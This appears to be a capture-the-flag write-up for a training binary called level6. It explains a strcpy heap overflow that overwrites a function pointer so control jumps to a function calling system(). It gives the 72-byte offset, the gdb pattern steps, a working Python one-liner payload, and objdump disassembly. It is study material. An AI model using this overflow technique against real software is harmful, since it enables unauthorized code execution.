- attack: buffer overflow
- binary behavior: segfault without parameter, Nope with parameter
- targeted functions: n, m and main
- vulnerability in n: strcpy() in comparison to strncpy() has no limitimg argument
- defense: function n with system call is non-called

Method:
- find the overflow size of strcpy
- find eip offest size after overwlofing strcpy
- find the address of n function
- overflow and change eip address by n address
 
Info:
- offset size - 72
- 08048454 - address of n function
- same in hex - \x54\x84\x04\x08

Code:
objdump -d ./level6
gdb level6
(gdb) set args Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
(gdb) r
./level6 $(python -c 'print "b" * 72 + "\x54\x84\x04\x08"') 

QA:
- how do we know the correct offset?
- overflow by any number -> get address and put it in 'find offset' (pattern and offset are related)

Functions

0804847c <main>:
 804847c:       55                      push   %ebp
 804847d:       89 e5                   mov    %esp,%ebp
 804847f:       83 e4 f0                and    $0xfffffff0,%esp
 8048482:       83 ec 20                sub    $0x20,%esp
 8048485:       c7 04 24 40 00 00 00    movl   $0x40,(%esp)
 804848c:       e8 bf fe ff ff          call   8048350 <malloc@plt>
 8048491:       89 44 24 1c             mov    %eax,0x1c(%esp)
 8048495:       c7 04 24 04 00 00 00    movl   $0x4,(%esp)
 804849c:       e8 af fe ff ff          call   8048350 <malloc@plt>
 80484a1:       89 44 24 18             mov    %eax,0x18(%esp)
 80484a5:       ba 68 84 04 08          mov    $0x8048468,%edx
 80484aa:       8b 44 24 18             mov    0x18(%esp),%eax
 80484ae:       89 10                   mov    %edx,(%eax)
 80484b0:       8b 45 0c                mov    0xc(%ebp),%eax
 80484b3:       83 c0 04                add    $0x4,%eax
 80484b6:       8b 00                   mov    (%eax),%eax
 80484b8:       89 c2                   mov    %eax,%edx
 80484ba:       8b 44 24 1c             mov    0x1c(%esp),%eax
 80484be:       89 54 24 04             mov    %edx,0x4(%esp)
 80484c2:       89 04 24                mov    %eax,(%esp)
 80484c5:       e8 76 fe ff ff          call   8048340 <strcpy@plt> # vulnerability
 80484ca:       8b 44 24 18             mov    0x18(%esp),%eax
 80484ce:       8b 00                   mov    (%eax),%eax
 80484d0:       ff d0                   call   *%eax
 80484d2:       c9                      leave
 80484d3:       c3                      ret

08048454 <n>:
 8048454:       55                      push   %ebp
 8048455:       89 e5                   mov    %esp,%ebp
 8048457:       83 ec 18                sub    $0x18,%esp
 804845a:       c7 04 24 b0 85 04 08    movl   $0x80485b0,(%esp)
 8048461:       e8 0a ff ff ff          call   8048370 <system@plt> #exploit
 8048466:       c9                      leave
 8048467:       c3                      ret

08048468 <m>:
 8048468:       55                      push   %ebp
 8048469:       89 e5                   mov    %esp,%ebp
 804846b:       83 ec 18                sub    $0x18,%esp
 804846e:       c7 04 24 d1 85 04 08    movl   $0x80485d1,(%esp)
 8048475:       e8 e6 fe ff ff          call   8048360 <puts@plt> # prints Nope
 804847a:       c9                      leave
 804847b:       c3                      ret

